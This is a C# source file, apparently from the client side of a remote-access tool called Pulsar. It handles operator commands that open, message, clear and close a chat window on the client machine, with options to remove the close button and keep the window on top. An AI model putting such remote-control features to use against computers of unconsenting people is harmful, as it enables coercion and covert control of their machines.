using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages.UserSupport.RemoteChat;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace Pulsar.Client.Messages
{
    public class RemoteChatHandler : IMessageProcessor
    {
        private static Thread _chatThread;
        private static bool _chatThreadRunning;

        public bool CanExecute(IMessage message) => message is DoChat || message is DoKillChatForm || message is DoStartChatForm || message is DoChatAction;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoChat Msg:
                    HandleDoChatMessage(sender, Msg);
                    break;
                case DoStartChatForm Msg:
                    HandleDoChatStart(sender, Msg);
                    break;
                case DoKillChatForm Msg:
                    HandleDoChatStop(sender, Msg);
                    break;
                case DoChatAction Msg:
                    HandleChatAction(sender, Msg);
                    break;
            }
        }

        public void HandleChatAction(ISender sender, DoChatAction msg)
        {
            if (_chatThread != null && _chatThread.IsAlive)
            {
                _chatThreadRunning = false;
                var frmChat = (Client.FrmRemoteChat)Application.OpenForms["FrmRemoteChat"];
                if (frmChat != null)
                {
                    frmChat.Invoke((MethodInvoker)delegate
                    {
                        frmChat.txtMessages.Clear();
                    });
                }
                _chatThread.Join(500); 
                _chatThread = null;
            }
        }

        public static void HandleDoChatStart(ISender client, DoStartChatForm getChat)
        {

            if (_chatThread != null && _chatThread.IsAlive)
                return;

            _chatThreadRunning = true;
            _chatThread = new Thread(() =>
            {
                var frmChat = new Client.FrmRemoteChat(client);
                frmChat.Text = getChat.Title;
                frmChat.txtMessages.Text = getChat.WelcomeMessage;
                if (getChat.DisableClose == true)
                {
                    frmChat.ControlBox = false;
                }
                frmChat.txtMessage.Enabled = getChat.DisableType;
              
                Application.Run(frmChat);
                frmChat.TopMost = getChat.TopMost;
                frmChat.BringToFront();
            });
            _chatThread.SetApartmentState(ApartmentState.STA);
            _chatThread.Start();
        }

        public static void HandleDoChatMessage(ISender client, DoChat packet)
        {
            var frmChat = (Client.FrmRemoteChat)Application.OpenForms["FrmRemoteChat"];
            if (frmChat != null)
            {
                frmChat.Invoke((MethodInvoker)delegate
                {
                    frmChat.AddMessage(packet.User, packet.PacketDms);
                });
            }
        }

        public static void HandleDoChatStop(ISender client, DoKillChatForm packet)
        {
            if (_chatThread != null && _chatThread.IsAlive)
            {
                _chatThreadRunning = false;
                var frmChat = (Client.FrmRemoteChat)Application.OpenForms["FrmRemoteChat"];
                if (frmChat != null)
                {
                    frmChat.Invoke((MethodInvoker)delegate
                    {
                        frmChat.Active = false;
                        frmChat.Close();
                    });
                }
                _chatThread.Join(500); 
                _chatThread = null;
            }
        }
    }
}
